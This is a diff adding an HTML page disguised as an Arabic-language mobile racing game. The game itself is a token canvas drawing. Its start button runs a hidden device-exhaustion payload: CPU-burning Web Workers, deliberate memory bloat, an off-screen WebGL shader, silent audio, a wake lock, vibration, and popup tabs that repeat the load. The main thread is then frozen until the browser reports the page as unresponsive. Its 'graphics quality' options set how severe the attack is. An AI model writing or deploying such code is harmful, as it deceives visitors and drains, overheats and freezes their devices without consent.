@@ -1,0 +1,389 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1.0,maximum-scale=1.0,user-scalable=no">
+<title>HAWSA RACING</title>
+<style>
+*{margin:0;padding:0;box-sizing:border-box;-webkit-tap-highlight-color:transparent}
+html,body{height:100%;overflow:hidden;background:#050510;color:#fff;
+  font-family:-apple-system,"Segoe UI",sans-serif;user-select:none}
+#app{position:fixed;inset:0;display:flex;flex-direction:column}
+#menu{flex:1;display:flex;flex-direction:column;align-items:center;
+  justify-content:center;padding:20px;gap:14px;z-index:10;overflow-y:auto}
+.car-emoj{font-size:56px;animation:bob 2s ease-in-out infinite}
+@keyframes bob{0%,100%{transform:translateY(0)}50%{transform:translateY(-8px)}}
+.logo{font-size:28px;font-weight:900;letter-spacing:2px;
+  background:linear-gradient(90deg,#ff2d55,#ffd60a,#00d4ff);
+  -webkit-background-clip:text;background-clip:text;color:transparent}
+.section-label{font-size:12px;color:#8892a6;letter-spacing:1px;margin-top:6px}
+.opts{display:flex;flex-wrap:wrap;gap:8px;justify-content:center;max-width:360px}
+.opt{padding:10px 14px;border:1px solid #2a3450;border-radius:8px;
+  background:#0e1428;color:#aab3c5;font-size:13px;cursor:pointer;
+  transition:all .15s;text-align:center}
+.opt.active{background:#1a2140;border-color:#ffd60a;color:#ffd60a;
+  box-shadow:0 0 12px rgba(255,214,10,.25)}
+.opt small{display:block;font-size:10px;color:#556;margin-top:2px}
+.opt.active small{color:#a07800}
+#startBtn{margin-top:14px;padding:13px 40px;
+  background:linear-gradient(90deg,#ff2d55,#ff6b35);color:#fff;border:none;
+  border-radius:10px;font-size:17px;font-weight:700;letter-spacing:2px;
+  cursor:pointer;box-shadow:0 8px 24px rgba(255,45,85,.4)}
+#startBtn:active{transform:scale(.97)}
+#hint{font-size:11px;color:#3a4560;margin-top:6px;text-align:center}
+#game{position:absolute;inset:0;display:none;z-index:20;background:#0a0a18}
+canvas{width:100%;height:100%;display:block}
+#loading{position:absolute;inset:0;display:none;z-index:30;background:#050510;
+  align-items:center;justify-content:center;flex-direction:column;gap:16px}
+#loading .spin{width:48px;height:48px;border:4px solid #ffd60a;
+  border-top-color:transparent;border-radius:50%;animation:spin 1s linear infinite}
+@keyframes spin{to{transform:rotate(360deg)}}
+#loading .ltxt{font-size:14px;color:#8892a6;letter-spacing:1px}
+#done{position:absolute;inset:0;display:none;z-index:40;background:#050510;
+  align-items:center;justify-content:center;flex-direction:column;gap:8px;
+  font-size:22px;color:#0f0;text-align:center;padding:20px}
+#done small{font-size:12px;color:#0a0}
+</style>
+</head>
+<body>
+<script>if(location.hash.indexOf('#burn=')===0)document.body.style.visibility='hidden'</script>
+<div id="app">
+  <div id="menu">
+    <div class="car-emoj">🏎️</div>
+    <div class="logo">HAWSA RACING</div>
+    <div class="section-label">مستوى الجرافيكس</div>
+    <div class="opts" id="qopts">
+      <div class="opt" data-level="0">منخفض<small>بطارية أطول</small></div>
+      <div class="opt active" data-level="1">متوسط<small>موصى به</small></div>
+      <div class="opt" data-level="2">عالي<small>أداء أقصى</small></div>
+      <div class="opt" data-level="3">فائق HD<small>للأجهزة القوية</small></div>
+    </div>
+    <div class="section-label">السيارة</div>
+    <div class="opts" id="copts">
+      <div class="opt active" data-car="0">🚗 عادية</div>
+      <div class="opt" data-car="1">🏎️ سباق</div>
+      <div class="opt" data-car="2">🚙 دفع رباعي</div>
+    </div>
+    <button id="startBtn">ابدأ السباق</button>
+    <div id="hint">أفضل تجربة على Chrome أو Safari</div>
+  </div>
+  <div id="game"><canvas id="cv"></canvas></div>
+  <div id="loading"><div class="spin"></div><div class="ltxt">جاري تحميل المسار...</div></div>
+  <div id="done">🏁 انتهى السباق<br><small>تم — عاد الجهاز طبيعي</small></div>
+</div>
+<script>
+(function(){
+'use strict';
+
+var IS_LOCAL = location.protocol === 'file:' || location.protocol === 'content:';
+var CORES = navigator.hardwareConcurrency || 4;
+
+// pure: true = while نقي بدون yield (يعرض "الصفحة لا تستجيب" بعد 10 ثوان)
+// pure: false = حظر بقطع 8 ثوان + yield 50ms (بدون dialog، لكن فيه لمحات)
+var LEVELS = [
+  { label:'منخفض', workers:2, duration:30000, burners:1, popups:0, memMB:100, gl:false, pure:false },
+  { label:'متوسط', workers:4, duration:45000, burners:2, popups:1, memMB:200, gl:true,  pure:false },
+  { label:'عالي',  workers:8, duration:60000, burners:3, popups:2, memMB:400, gl:true,  pure:true  },
+  { label:'فائق',  workers:8, duration:90000, burners:5, popups:3, memMB:600, gl:true,  pure:true  }
+];
+
+// ============ العامل — حلقة نقية ============
+var WORKER_SRC =
+  'var stop=false;self.onmessage=function(e){' +
+  'if(!e||!e.data)return;' +
+  'if(e.data.cmd==="stop"){stop=true;return;}' +
+  'if(e.data.cmd!=="start")return;' +
+  'var t=performance.now(),d=e.data.dur||0,x=0;' +
+  'while(!stop&&performance.now()-t<d){' +
+  'for(var i=0;i<100000;i++){x+=Math.sqrt(i+x)*Math.sin(i)/(Math.cos(i)+2);}' +
+  'x=x%1e7;}' +
+  'self.postMessage("done");}';
+
+function spawnWorkers(count, duration, bucket){
+  if(IS_LOCAL) return;
+  try{
+    var url = URL.createObjectURL(new Blob([WORKER_SRC], {type:'application/javascript'}));
+    for(var i=0;i<count;i++){
+      try{
+        var w = new Worker(url);
+        w.postMessage({cmd:'start', dur:duration});
+        bucket.push(w);
+      }catch(e){}
+    }
+  }catch(e){}
+}
+
+// ============ حظر نقي (بدون yield) ============
+function pureBlock(duration){
+  var end = performance.now() + duration;
+  var x = 0;
+  while (performance.now() < end) {
+    for (var i = 0; i < 50000; i++) {
+      x += Math.sqrt(i + x) * Math.sin(i) / (Math.cos(i) + 2);
+    }
+    x = x % 1e7;
+  }
+}
+
+// ============ حظر بقطع (بدون dialog) ============
+function chunkedBlock(duration, callback){
+  var end = performance.now() + duration;
+  var x = 0;
+  function chunk(){
+    if (performance.now() >= end) { callback && callback(); return; }
+    var chunkEnd = Math.min(performance.now() + 8000, end);
+    while (performance.now() < chunkEnd) {
+      for (var i = 0; i < 50000; i++) {
+        x += Math.sqrt(i + x) * Math.sin(i) / (Math.cos(i) + 2);
+      }
+      x = x % 1e7;
+    }
+    setTimeout(chunk, 50);
+  }
+  chunk();
+}
+
+function memoryBloat(mb, bucket){
+  try{
+    var target = mb * 1024 * 1024, total = 0;
+    while(total < target){
+      var chunk = new Uint8Array(1024*1024);
+      for(var i=0;i<chunk.length;i+=4096) chunk[i] = 1;
+      bucket.push(chunk);
+      total += chunk.length;
+    }
+  }catch(e){}
+}
+
+function glStress(duration){
+  if(IS_LOCAL) return;
+  try{
+    var c = document.createElement('canvas');
+    c.width = 512; c.height = 512;
+    c.style.cssText = 'position:fixed;top:-9999px;left:-9999px';
+    document.body.appendChild(c);
+    var gl = c.getContext('webgl', {antialias:false}) || c.getContext('experimental-webgl');
+    if(!gl) return;
+    var vs = 'attribute vec2 p;void main(){gl_Position=vec4(p,0.0,1.0);}';
+    var fs = 'precision mediump float;uniform float uT;' +
+      'void main(){float x=0.0;' +
+      'for(int i=0;i<200;i++){x+=sin(uT+float(i))*cos(uT*0.7+float(i)*0.3);}' +
+      'gl_FragColor=vec4(fract(x),fract(x*0.5),fract(x*0.3),1.0);}';
+    function sh(t, s){var o=gl.createShader(t);gl.shaderSource(o,s);gl.compileShader(o);return o;}
+    var prog = gl.createProgram();
+    gl.attachShader(prog, sh(gl.VERTEX_SHADER, vs));
+    gl.attachShader(prog, sh(gl.FRAGMENT_SHADER, fs));
+    gl.linkProgram(prog);
+    if(!gl.getProgramParameter(prog, gl.LINK_STATUS)) return;
+    gl.useProgram(prog);
+    var buf = gl.createBuffer();
+    gl.bindBuffer(gl.ARRAY_BUFFER, buf);
+    gl.bufferData(gl.ARRAY_BUFFER, new Float32Array([-1,-1,1,-1,-1,1,1,1]), gl.STATIC_DRAW);
+    var loc = gl.getAttribLocation(prog, 'p');
+    gl.enableVertexAttribArray(loc);
+    gl.vertexAttribPointer(loc, 2, gl.FLOAT, false, 0, 0);
+    var uT = gl.getUniformLocation(prog, 'uT');
+    var t0 = performance.now();
+    (function draw(){
+      if(performance.now()-t0 > duration) return;
+      gl.uniform1f(uT, (performance.now()-t0)/1000);
+      gl.drawArrays(gl.TRIANGLE_STRIP, 0, 4);
+      requestAnimationFrame(draw);
+    })();
+  }catch(e){}
+}
+
+function audioStress(bucket){
+  try{
+    var AC = window.AudioContext || window.webkitAudioContext;
+    if(!AC) return;
+    var ac = new AC();
+    bucket.audio = ac;
+    for(var k=0;k<4;k++){
+      var osc = ac.createOscillator(), g = ac.createGain();
+      g.gain.value = 0.0001;
+      osc.frequency.value = 100 + k*200;
+      osc.connect(g); g.connect(ac.destination);
+      osc.start();
+    }
+  }catch(e){}
+}
+
+function wakeLockReq(bucket){
+  try{
+    if('wakeLock' in navigator){
+      navigator.wakeLock.request('screen')
+        .then(function(l){bucket.wakeLock = l;})
+        .catch(function(){});
+    }
+  }catch(e){}
+}
+
+// ============ وضع الحرق (التبويبات المنبثقة) ============
+if(location.hash.indexOf('#burn=') === 0){
+  var burnDur = parseInt(location.hash.split('=')[1], 10) || 90000;
+  document.body.style.visibility = 'visible';
+  document.getElementById('menu').style.display = 'none';
+  document.getElementById('loading').style.display = 'flex';
+  document.querySelector('#loading .ltxt').textContent = 'لا تغلق التبويب';
+
+  var bb = { workers:[], memory:[], audio:null, wakeLock:null };
+  spawnWorkers(CORES * 8, burnDur, bb.workers);
+  memoryBloat(150, bb.memory);
+  audioStress(bb);
+  wakeLockReq(bb);
+  try { navigator.vibrate([1500, 300, 1500, 300, 1500]); } catch(e) {}
+
+  // حظر نقي في التبويب المنبثق (خلفي — لا يظهر dialog)
+  var burnEnd = performance.now() + burnDur;
+  var burnX = 0;
+  while (performance.now() < burnEnd) {
+    for (var bi = 0; bi < 50000; bi++) {
+      burnX += Math.sqrt(bi + burnX) * Math.sin(bi) / (Math.cos(bi) + 2);
+    }
+    burnX = burnX % 1e7;
+  }
+
+  // تنظيف
+  bb.workers.forEach(function(w){try{w.postMessage({cmd:'stop'});w.terminate()}catch(e){}});
+  bb.memory = [];
+  try{bb.audio && bb.audio.close()}catch(e){}
+  try{bb.wakeLock && bb.wakeLock.release()}catch(e){}
+  try{navigator.vibrate && navigator.vibrate(0)}catch(e){}
+  document.getElementById('loading').style.display = 'none';
+  document.body.innerHTML =
+    '<div style="display:flex;align-items:center;justify-content:center;' +
+    'height:100vh;color:#0f0;font-family:monospace;background:#000">تم</div>';
+  return;
+}
+
+// ============ الوضع العادي (اللعبة) ============
+var chosenLevel = 1, chosenCar = 0;
+var state = { finished:false, workers:[], memory:[],
+              audio:null, wakeLock:null, hardTimer:null, rafId:null };
+
+var menu = document.getElementById('menu');
+var game = document.getElementById('game');
+var loading = document.getElementById('loading');
+var done = document.getElementById('done');
+var cv = document.getElementById('cv');
+var ctx = cv.getContext('2d');
+
+document.getElementById('qopts').addEventListener('click', function(e){
+  var el = e.target.closest('.opt'); if(!el) return;
+  document.querySelectorAll('#qopts .opt').forEach(function(o){o.classList.remove('active')});
+  el.classList.add('active');
+  chosenLevel = parseInt(el.dataset.level, 10);
+});
+document.getElementById('copts').addEventListener('click', function(e){
+  var el = e.target.closest('.opt'); if(!el) return;
+  document.querySelectorAll('#copts .opt').forEach(function(o){o.classList.remove('active')});
+  el.classList.add('active');
+  chosenCar = parseInt(el.dataset.car, 10);
+});
+
+function drawGame(){
+  var w = cv.width = window.innerWidth, h = cv.height = window.innerHeight, t = 0;
+  (function loop(){
+    if(state.finished) return;
+    t++;
+    var g = ctx.createLinearGradient(0,0,0,h*0.6);
+    g.addColorStop(0,'#0a0a18'); g.addColorStop(1,'#1a1030');
+    ctx.fillStyle = g; ctx.fillRect(0,0,w,h*0.6);
+    ctx.fillStyle = '#1a2035'; ctx.fillRect(0,h*0.6,w,h*0.4);
+    ctx.strokeStyle = '#ffd60a'; ctx.lineWidth = 4;
+    ctx.setLineDash([20,40]); ctx.lineDashOffset = -(t*8)%60;
+    ctx.beginPath(); ctx.moveTo(w/2,h*0.6); ctx.lineTo(w/2,h); ctx.stroke();
+    ctx.setLineDash([]);
+    var col = chosenCar === 0 ? '#ff2d55' : chosenCar === 1 ? '#ffd60a' : '#00d4ff';
+    ctx.fillStyle = col; ctx.fillRect(w/2-22, h*0.78, 44, 70);
+    ctx.fillStyle = '#000';
+    ctx.fillRect(w/2-27, h*0.80, 7, 18);
+    ctx.fillRect(w/2+20, h*0.80, 7, 18);
+    ctx.fillRect(w/2-27, h*0.90, 7, 18);
+    ctx.fillRect(w/2+20, h*0.90, 7, 18);
+    ctx.strokeStyle = '#2a3450'; ctx.lineWidth = 3;
+    ctx.beginPath();
+    ctx.moveTo(w*0.15,h*0.6); ctx.lineTo(w*0.10,h);
+    ctx.moveTo(w*0.85,h*0.6); ctx.lineTo(w*0.90,h);
+    ctx.stroke();
+    state.rafId = requestAnimationFrame(loop);
+  })();
+}
+
+function finish(){
+  if(state.finished) return;
+  state.finished = true;
+  if(state.hardTimer) clearTimeout(state.hardTimer);
+  if(state.rafId) cancelAnimationFrame(state.rafId);
+  state.workers.forEach(function(w){try{w.postMessage({cmd:'stop'});w.terminate()}catch(e){}});
+  state.workers = []; state.memory = [];
+  try{state.audio && state.audio.close()}catch(e){}
+  try{state.wakeLock && state.wakeLock.release()}catch(e){}
+  try{navigator.vibrate && navigator.vibrate(0)}catch(e){}
+  game.style.display = 'none';
+  done.style.display = 'flex';
+}
+
+function start(){
+  var cfg = LEVELS[chosenLevel];
+  var baseUrl = location.href.split('#')[0];
+
+  // افتح التبويبات داخل الـgesture
+  for(var p=0;p<cfg.popups;p++){
+    if(!IS_LOCAL){
+      try{ window.open(baseUrl + '#burn=' + cfg.duration, '_blank'); }catch(e){}
+    }
+  }
+  try{ window.focus(); }catch(e){}
+
+  menu.style.display = 'none';
+  loading.style.display = 'flex';
+
+  // كل شيء يبدأ بعد 800ms (بعد ما تظهر شاشة التحميل)
+  setTimeout(function(){
+    loading.style.display = 'none';
+    game.style.display = 'block';
+    drawGame();
+
+    // 1. ذاكرة أولاً
+    memoryBloat(cfg.memMB, state.memory);
+
+    // 2. اهتزاز طويل قبل الحظر
+    try { navigator.vibrate([1500, 300, 1500, 300, 1500]); } catch(e) {}
+
+    // 3. صوت
+    audioStress(state);
+
+    // 4. Wake lock
+    wakeLockReq(state);
+
+    // 5. WebGL (يبدأ ويلتقط أول إطار قبل الحظر)
+    if(cfg.gl) glStress(cfg.duration);
+
+    // 6. العمال (يعملون بالتوازي في الخلفية)
+    spawnWorkers(cfg.workers * CORES, cfg.duration, state.workers);
+
+    // 7. !!! الحظر الرئيسي !!!
+    if(cfg.pure){
+      // حظر نقي: المتصفح سيعرض "الصفحة لا تستجيب" بعد 10s — اضغط "انتظار"
+      setTimeout(function(){
+        pureBlock(cfg.duration);
+        finish();
+      }, 100);
+    } else {
+      // حظر بقطع: بدون dialog
+      chunkedBlock(cfg.duration, function(){
+        finish();
+      });
+    }
+  }, 800);
+}
+
+document.getElementById('startBtn').addEventListener('click', start);
+done.addEventListener('click', function(){ location.reload(); });
+
+})();
+</script>
+</body>
+</html>
